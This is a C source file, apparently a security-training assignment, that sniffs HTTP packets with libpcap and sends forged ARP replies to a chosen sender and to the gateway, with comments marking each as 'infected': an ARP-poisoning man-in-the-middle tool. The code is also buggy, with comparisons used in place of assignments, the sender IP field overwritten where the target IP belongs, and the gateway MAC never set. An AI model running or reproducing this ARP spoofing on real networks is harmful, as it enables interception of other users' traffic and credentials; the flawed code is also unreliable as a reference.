
/*
KITRI BEST OF THE BEST 6TH
CONSULTING PeTrA 
CHO HUI GWON
*/
//#include <Qcorepplication>
#include <netinet/in.h>
#include <netinet/ether.h>
//#include <fstream>
#include <stdlib.h>
#include <arpa/inet.h>

#include <pcap.h>
#include <stdio.h>

#include <stdint.h>

/*
Header Structure 
*/
/*
struct ether_addr{
        unsigned char ether_addr_octet[6];
};
*/
/*
struct ether_header{
        struct  ether_addr ether_dhost;
        struct  ether_addr ether_shost;
        unsigned short ether_type;
};*/

struct ip_header{
        unsigned char ip_header_len:4;
        unsigned char ip_version:4;
        unsigned char ip_tos;
        unsigned short ip_total_length;
        unsigned short ip_id;
        unsigned char ip_frag_offset:5;
        unsigned char ip_more_fragment:1;
        unsigned char ip_dont_fragment:1;
        unsigned char ip_reserved_zero:1;
        unsigned char ip_frag_offset1;
        unsigned char ip_ttl;
        unsigned char ip_protocol;
        unsigned short ip_checksum;
        struct in_addr ip_srcaddr;
        struct in_addr ip_destaddr;
};
 
struct tcp_header{
        unsigned short source_port;
        unsigned short dest_port;
	/*
	unsigned int -> uint16_t (stdint.h)
	*/
	uint16_t sequence;
	uint16_t acknowledge;
	/*
        unsigned int sequence;
        unsigned int acknowledge;
	*/
        unsigned char ns:1;
        unsigned char reserved_part1:3;
        unsigned char data_offset:4;
        unsigned char fin:1;
        unsigned char syn:1;
        unsigned char rst:1;
        unsigned char psh:1;
        unsigned char ack:1;
        unsigned char urg:1;
        unsigned char ecn:1;
        unsigned char cwr:1;
        unsigned short window;
        unsigned short checksum;
        unsigned short urgent_pointer;
};

/*
Header print Function
*/ 
void print_ether_header(const unsigned char *data);
int print_ip_header(const unsigned char *data);
int print_tcp_header(const unsigned char *data);
void print_data(const unsigned char *data);

int exceptionNum = 0;	//	exception : if((!ether) || (!ip) || (!tcp) )
char addr_buf[20];	//	buffer for IP Address

int sendArpReply(pcap_t *handle, struct pcap_pkthdr *header, char *senderMAC, char *senderIP, char *targetMAC, char *targetIP);
/*
Main Function
*/
int main(int argc, char *argv[]){
	int res;	//	test
	pcap_t *handle;
	char *dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;
	char filter_exp[] = "port 80";
	bpf_u_int32 mask;
	bpf_u_int32 net;
	struct pcap_pkthdr *header;
	const u_char *packet;
	int temp = 0;	//	tempNumber;
	//dev = pcap_lookupdev(errbuf);
	
	char *senderIP;
	char *targetIP;
	u_char mypacket[42];

	int key = 0;
	int i;

	char senderMAC[18];
	char targetMAC[18];
	char gatewayMAC[18];
	char myIP[16];
	char gatewayIP[16];
	
	char bufff[256];
	FILE *tempfp;

	struct ether_header *eth;
	struct ether_arp *arp;

	if(argc == 1){
		printf("ERROR : Send dev name\n");
		return 0;
	}

	dev = argv[1];
	
	if(argc == 2){
		printf("ERROR : Write sender IP Address\n");
		return 0;
	}
	
	senderIP = argv[2];

	if(argc == 3){
		printf("ERROR : Write target IP Address\n");
		return 0;
	}
	//
	targetIP = argv[3];

	tempfp = popen("ifconfig | grep \"ether\" | awk '{print $2'}", "r");
	if(tempfp == NULL){
		perror("popen failed");
		return -1;
	}
	while(fgets(senderMAC, 19, tempfp) != NULL){
		//printf("%s", senderMAC);
	}
	pclose(tempfp);

	tempfp = popen("ifconfig | grep \"inet\" | sed -n 1p | awk '{print $2'}", "r");
	if(tempfp == NULL){
		perror("popen failed");
		return -1;
	}
	while(fgets(myIP, 17, tempfp) != NULL){
		//printf("%s", myIP);
	}
	pclose(tempfp);
	
	tempfp = popen("netstat -rn | grep 0.0.0.0 | sed -n 1p | awk '{print $2}'", "r");
	if(tempfp == NULL){
		perror("popen failed");
		return -1;
	}
	while(fgets(gatewayIP, 17, tempfp) != NULL){
		//printf("%s", gatewayIP);	
	}
	pclose(tempfp);
	printf("Device : %s\n", dev);	//	print Interface Device
	printf("sender IP Address : %s\n", senderIP);
	printf("target IP Address : %s\n", targetIP);
	printf("My MAC Adress : %s", senderMAC);
	printf("My IP Address : %s", myIP);
	printf("Gateway IP Address : %s\n", gatewayIP);
	if(dev == NULL){
		fprintf(stderr, "Couldn't find default device : %s\n", errbuf);
		return (2);
	}

	if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1){
		fprintf(stderr, "Couldn't get netmask for device %s : %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}
	
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL){
		fprintf(stderr, "Couldn't open device %s : %s\n", dev, errbuf);
		return (2);
	}
	
	if(pcap_compile(handle, &fp, filter_exp, 0, net) == -1){
		fprintf(stderr, "Couldn't parse filter %s : %s\n", filter_exp, pcap_geterr(handle));
		return (2);
	}
	
	if(pcap_setfilter(handle, &fp) == -1){
		fprintf(stderr, "Couldn't install filter %s : %s\n", filter_exp, pcap_geterr(handle));
		return (2);
	}

	printf("1 : Watch packet ||||| 2 : Send packet\n");
	printf("OK, Ready to move. Select the Object :) >> ");
	scanf("%d", &key);

	if(key == 1){
		while(1){
			exceptionNum == 0;
			res = pcap_next_ex(handle, &header, &packet);
			printf("Jacked a packet with length of [%d]\n", header->len);
		
			if(res == 0){
				continue;
			}else if(res == -1){
				printf("Error : Fail to read the packets");
				continue;
			}
		
			print_ether_header(packet);
			if(exceptionNum == 1){
				continue;
			}
			packet = packet + 14;
			temp = print_ip_header(packet);
			if(exceptionNum == 1){
				continue;
			}
			packet = packet + temp;
			temp = print_tcp_header(packet);
	
			packet = packet + temp;
			print_data(packet);
		}
	}else if(key == 2){
		/*
		printf("*\n");
		tempfp = popen("ifconfig | grep \"ether\" | awk '{print $2}'", "r");
		if(tempfp = NULL){
			perror("popen() failed");
			return -1;
		}
		printf("*\n");
		while(fgets(senderMAC, 19, tempfp));
		printf("*\n");
		pclose(tempfp);
		printf("sender MAC : %s\n", senderMAC);*/
		
		//send arp request
		/*
		dest mac addr
		mypacket[0] = 0xff;
		mypacket[1] = 0xff;
		mypacket[2] = 0xff;
		mypacket[3] = 0xff;
		mypacket[4] = 0xff;
		mypacket[5] = 0xff;

		src mac addr
		mypacket[6] = 0x00;
		mypacket[7] = 0x11;
		mypacket[8] = 0x22;
		mypacket[9] = 0x33;
		mypacket[10] = 0x44;
		mypacket[11] = 0x55senderMAC;

		arp
		mypacket[12] = 0x08;
		mypacket[13] = 0x06;

		Hardware type : ethernet
		mypacket[14] = 0x00;//0x08;
		mypacket[15] = 0x01;//0x00;

		protocol type : ip
		mypacket[16] = 0x08;
		mypacket[17] = 0x00;

		Hardware Length
		mypacket[18] = 0x06;
	struct ether_header *eth;
	struct ether_arp *arp;



		Protocol Length
		mypacket[19] = 0x04;

		Operation, 1 : request   2 : reply
		mypacket[20] = 0x00//0x01;
		mypacket[21] = 0x01//0x02;

		Sender MAC addr
		sprintf(mypacket[22], "%x", senderMAC[0]);

		
		mypacket[22] = senderMAC[0]; 
		mypacket[23] = senderMAC[1];
		mypacket[24] = senderMAC[3];
		mypacket[25] = senderMAC[4];
		mypacket[26] = senderMAC[6];
		mypacket[27] = senderMAC[7];
		
		Sender IP addr
		mypacket[28] = 0xff;
		mypacket[29] = 0xff;
		mypacket[30] = 0xff;
		mypacket[31] = 0xff;

		Target MAC addr
		mypacket[32] = 0xff;
		mypacket[33] = 0xff;
		mypacket[34] = 0xff;
		mypacket[35] = 0xff;

		mypacket[37] = 0xff;

		Target IP addr
		mypacket[38] = 0xff;
		mypacket[39] = 0xff;
		mypacket[40] = 0xff;
		mypacket[41] = 0xff;

		for(i = 0; i < 100; i++){
			mypacket[i] = i%256;
		}
		*/
		/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		/*	
		eth = (struct ether_header *)mypacket;
		ether_aton_r("ff:ff:ff:ff:ff:ff", (struct ether_addr *)eth->ether_dhost);
		ether_aton_r(senderMAC, (struct ether_addr *)eth->ether_shost);
		eth->ether_type = htons(ETHERTYPE_ARP);

		arp = (struct ether_arp *)(mypacket + ETH_HLEN);
		arp->arp_hrd = htons(ARPHRD_ETHER);	// Hardware type
		arp->arp_pro = htons(ETHERTYPE_IP);	// Protocol type
		arp->arp_hln = ETHER_ADDR_LEN;		// Hardware length
		arp->arp_pln = sizeof(struct in_addr);	// Protocol length
		arp->arp_op = htons(ARPOP_REQUEST);	// operation request : 1, repley : 2
		ether_aton_r(senderMAC, (struct ether_addr *)arp->arp_sha);	// Sender Hardware Address
		inet_pton(AF_INET, senderIP, arp->arp_spa);	// Sender IP Address
		ether_aton_r("ff:ff:ff:ff:ff:ff", (struct ether_addr *)arp->arp_tha);	// Target Hadware Address
		inet_pton(AF_INET, targetIP, arp->arp_spa);	// Sender IP Address
		if(pcap_sendpacket(handle, mypacket, sizeof(mypacket)) == -1){
			printf("Error : Fail to send the ARP Request\n");
			return 0;
		}else{
			printf("Sending ARP Request is Success :) \n");
		}

		while(1){
			exceptionNum == 0;
			res = pcap_next_ex(handle, &header, &packet);
			printf("Jacked a packet with length of [%d]\n", header->len);
		
			if(res == 0){
				continue;
			}else if(res == -1){
				printf("Error : Fail to read the packets");
				continue;
			}

			eth = (struct ether_header *)packet;
			arp = (struct ether_arp *)(packet + ETH_HLEN);

			if(ntohs(eth->ether_type) == ETHERTYPE_ARP){
				sprintf(targetMAC, "%s", ether_ntoa(((struct ether_addr *)arp->arp_sha)));
				printf("Received target MAC Address :)\n");
				break;
			}
		}

		eth = (struct ether_header *)mypacket;
		ether_aton_r(targetMAC, (struct ether_addr *)eth->ether_dhost);
		ether_aton_r(senderMAC, (struct ether_addr *)eth->ether_shost);
		eth->ether_type = htons(ETHERTYPE_ARP);

		arp = (struct ether_arp *)(mypacket + ETH_HLEN);
		arp->arp_hrd = htons(ARPHRD_ETHER);	// Hardware type
		arp->arp_pro = htons(ETHERTYPE_IP);	// Protocol type
		arp->arp_hln = ETHER_ADDR_LEN;		// Hardware length
		arp->arp_pln = sizeof(struct in_addr);	// Protocol length
		arp->arp_op = htons(ARPOP_REPLY);	// operation request : 1, reply : 2
		ether_aton_r(senderMAC, (struct ether_addr *)arp->arp_sha);	// Sender Hardware Address
		inet_pton(AF_INET, senderIP, arp->arp_spa);	// Sender IP Address
		ether_aton_r(targetMAC, (struct ether_addr *)arp->arp_tha);	// Target Hadware Address
		inet_pton(AF_INET, targetIP, arp->arp_spa);	// Sender IP Address
		if(pcap_sendpacket(handle, mypacket, sizeof(mypacket)) == -1){
			printf("Error : Fail to send the ARP Reply\n");
			return 0;
		}else{
			printf("Sending ARP Reply is Success :) \n");
		}*/
		//int sendArpReply(pcap_t *handle, struct pcap_pkthdr *header, char *senderMAC, char *senderIP, char *targetMAC, char *targetIP){
		if(sendArpReply(handle, header, senderMAC, senderIP, targetMAC, targetIP) == -1){
			printf("failed\n");
		}	//	sender infected

		if(sendArpReply(handle, header, senderMAC, targetIP, gatewayMAC, gatewayIP) == -1){
			printf("failed\n");
		}	//	gateway infected
			
	}else{}
	pcap_close(handle);
	return (0);
}

/*
Ethernet header print Function
*/
void print_ether_header(const unsigned char* data){
	struct ether_header *ether_head;
	unsigned short ether_type;
	ether_head = (struct ether_header *)data;
	
	ether_type = ntohs(ether_head->ether_type);
	
	if(ether_type != 0x0800){	//	if( !(ip))
		printf("Not IP Type\n");
		exceptionNum == 1;
		return;
		/*Return*/
		
	}
	
	printf("Dst Mac Addr [%02x:%02x:%02x:%02x:%02x:%02x]\n",
				ether_head->ether_dhost[0],
				ether_head->ether_dhost[1],
				ether_head->ether_dhost[2],
				ether_head->ether_dhost[3],
				ether_head->ether_dhost[4],
				ether_head->ether_dhost[5]);
	
	printf("Src Mac Addr [%02x:%02x:%02x:%02x:%02x:%02x]\n",
				ether_head->ether_shost[0],
				ether_head->ether_shost[1],
				ether_head->ether_shost[2],
				ether_head->ether_shost[3],
				ether_head->ether_shost[4],
				ether_head->ether_shost[5]);
				
	/*
	printf("Dst Mac Addr : %s\n", ether_head->ether_dhost);
	printf("Src Mac Addr : %s\n", ether_head->ether_shost);
	*/
}

/*
IP header print Function
*/
int print_ip_header(const unsigned char* data){
	struct ip_header *ip_head;
	ip_head = (struct ip_header*)data;
	
	/*
	char buf1[32] = {0, };
	char buf2[32] = {0, };E
	inet_pton(AF_INET, inet_ntoa(ip_head->ip_srcaddr), 
	
	*/
	if((ip_head->ip_protocol) != 0x06){	//	if( !(tcp))
		exceptionNum == 1;
		return ip_head->ip_header_len*4;
	}

	//printf("Src IP Address : %s\n", inet_ntop(AF_INET, 
	inet_ntop(AF_INET, &(ip_head->ip_srcaddr), addr_buf, sizeof(addr_buf));
	printf("Src IP Address : %s\n", addr_buf);
	inet_ntop(AF_INET, &(ip_head->ip_destaddr), addr_buf, sizeof(addr_buf));
	printf("Src IP Address : %s\n", addr_buf);
	/*
	printf("Src IP Address : %s\n", inet_ntoa(ip_head->ip_srcaddr));
	printf("Dst Ip Address : %s\n", inet_ntoa(ip_head->ip_destaddr));
	*/
	return ip_head->ip_header_len*4;
}

/*
TCP header print Function
*/
int print_tcp_header(const unsigned char* data){
	struct tcp_header *tcp_head;
	tcp_head = (struct tcp_header*)data;
	printf("Src Port : %d\n", ntohs(tcp_head->source_port));
	printf("Dst Port : %d\n", ntohs(tcp_head->dest_port));
	return tcp_head->data_offset*4;
}

/*
Data print Function
*/
void print_data(const unsigned char *data){
	printf("DATA\n");
	printf("%s\n", data);
}



/*
return 1 : Sccess,   return 0 : not excute,   return -1 : failed
 */
int sendArpReply(pcap_t *handle, struct pcap_pkthdr *header, char *senderMAC, char *senderIP, char *targetMAC, char *targetIP){
	u_char mypacket[42];
	struct ether_header *eth;
	struct ether_arp *arp;
	int res;
	const u_char *packet;
	eth = (struct ether_header *)mypacket;
	ether_aton_r("ff:ff:ff:ff:ff:ff", (struct ether_addr *)eth->ether_dhost);
	ether_aton_r(senderMAC, (struct ether_addr *)eth->ether_shost);
	eth->ether_type = htons(ETHERTYPE_ARP);
	arp = (struct ether_arp *)(mypacket + ETH_HLEN);
	arp->arp_hrd = htons(ARPHRD_ETHER);	// Hardware type
	arp->arp_pro = htons(ETHERTYPE_IP);	// Protocol type
	arp->arp_hln = ETHER_ADDR_LEN;		// Hardware length
	arp->arp_pln = sizeof(struct in_addr);	// Protocol length
	arp->arp_op = htons(ARPOP_REQUEST);	// operation request : 1, repley : 2
	ether_aton_r(senderMAC, (struct ether_addr *)arp->arp_sha);	// Sender Hardware Address
	inet_pton(AF_INET, senderIP, arp->arp_spa);	// Sender IP Address
	ether_aton_r("ff:ff:ff:ff:ff:ff", (struct ether_addr *)arp->arp_tha);	// Target Hadware Address
	inet_pton(AF_INET, targetIP, arp->arp_spa);	// Sender IP Address
	if(pcap_sendpacket(handle, mypacket, sizeof(mypacket)) == -1){
		printf("Error : Fail to send the ARP Request\n");
		return (-1);
	}else{
		printf("Sending ARP Request is Success :) \n");
	}
	while(1){
		exceptionNum == 0;
		res = pcap_next_ex(handle, &header, &packet);
		printf("Jacked a packet with length of [%d]\n", header->len);
		
		if(res == 0){
			continue;
		}else if(res == -1){
			printf("Error : Fail to read the packets");
			continue;
		}

		eth = (struct ether_header *)packet;
		arp = (struct ether_arp *)(packet + ETH_HLEN);

		if(ntohs(eth->ether_type) == ETHERTYPE_ARP){
			sprintf(targetMAC, "%s", ether_ntoa(((struct ether_addr *)arp->arp_sha)));
			printf("Received target MAC Address :)\n");
			break;
		}
	}

	eth = (struct ether_header *)mypacket;
	ether_aton_r(targetMAC, (struct ether_addr *)eth->ether_dhost);
	ether_aton_r(senderMAC, (struct ether_addr *)eth->ether_shost);
	eth->ether_type = htons(ETHERTYPE_ARP);
	arp = (struct ether_arp *)(mypacket + ETH_HLEN);
	arp->arp_hrd = htons(ARPHRD_ETHER);	// Hardware type
	arp->arp_pro = htons(ETHERTYPE_IP);	// Protocol type
	arp->arp_hln = ETHER_ADDR_LEN;		// Hardware length
	arp->arp_pln = sizeof(struct in_addr);	// Protocol length
	arp->arp_op = htons(ARPOP_REPLY);	// operation request : 1, reply : 2
	ether_aton_r(senderMAC, (struct ether_addr *)arp->arp_sha);	// Sender Hardware Address
	inet_pton(AF_INET, senderIP, arp->arp_spa);	// Sender IP Address
	ether_aton_r(targetMAC, (struct ether_addr *)arp->arp_tha);	// Target Hadware Address
	inet_pton(AF_INET, targetIP, arp->arp_spa);	// Sender IP Address
	if(pcap_sendpacket(handle, mypacket, sizeof(mypacket)) == -1){
		printf("Error : Fail to send the ARP Reply\n");
		return (-1);
	}else{
		printf("Sending ARP Reply is Success :) \n");
		return 1;
	}
	return 0;
}
